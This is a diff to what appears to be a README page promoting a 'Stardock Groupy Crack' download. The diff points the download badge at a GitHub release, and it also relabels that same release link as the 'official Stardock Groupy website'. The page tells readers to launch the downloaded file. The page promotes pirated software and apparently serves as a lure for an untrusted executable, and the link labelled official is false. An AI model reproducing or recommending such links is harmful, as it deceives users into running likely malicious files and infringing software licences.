@@ -23,7 +23,7 @@ Are you looking for Stardock Groupy Crack, download options, product key, or wan
 - what-is-stardock-groupy
 
 ### 🚀 Download Groupy Crack Here:
-[![Download Groupy Crack](https://img.shields.io/badge/Download%20Now-Groupy%20Crack-blue)](https://github.com/download/Program.zip)
+[![Download Groupy Crack](https://github.com/Jerem-Lee/Stardock_Groupy_Crack/releases/tag/v2.0%20Now-Groupy%20Crack-blue)](https://github.com/Jerem-Lee/Stardock_Groupy_Crack/releases/tag/v2.0)
 
 ### 🚀 **Launch the File After Download!**
 
@@ -37,7 +37,7 @@ Stardock Groupy is a powerful tool that helps you organize your windows into gro
 - **Multi-Tasking:** Switch between grouped windows quickly and effortlessly.
 
 ### 🌐 Want to Learn More about Stardock Groupy?
-Visit the [official Stardock Groupy website](https://www.stardock.com/products/groupy/) for in-depth information on features, pricing, and more.
+Visit the [official Stardock Groupy website](https://github.com/Jerem-Lee/Stardock_Groupy_Crack/releases/tag/v2.0) for in-depth information on features, pricing, and more.
 
 ### 💻 How to Use Groupy Crack:
 1. Download the Groupy Crack from the provided link.
